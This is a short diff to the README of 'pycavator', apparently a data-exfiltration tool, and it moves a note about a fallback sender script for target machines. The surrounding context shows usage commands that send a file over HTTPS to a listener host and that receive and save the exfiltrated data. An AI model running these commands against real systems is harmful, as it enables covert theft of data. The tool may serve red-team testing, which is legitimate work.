@@ -44,11 +44,12 @@ python pycavator-icmp.py --merge -x output -a 1 -b 10 -e txt -o output_folder
 ```bash
 python pycavator-https.py -f input.txt -d 192.168.1.101 -p 4443 -ca ca.pem -t "eyJhbGciO..._adQssw5c"
 ```
+> If in the target machine installation of required libraries is not possible, use `pycavator-httpsender.py` instead.
+
   <b>Listener mode: listen for incoming data and save to a single file</b><br/>
 ```bash
 python pycavator-https.py -l -s 192.168.1.100 -p 4443 -pb cert.pem -pk key.pem -o /tmp -t "eyJhbGciO..._adQssw5c"
 ``` 
-> If in the target machine installation of required libraries is not possible, use `pycavator-httpsender.py` instead.
 
 ## Installation
 
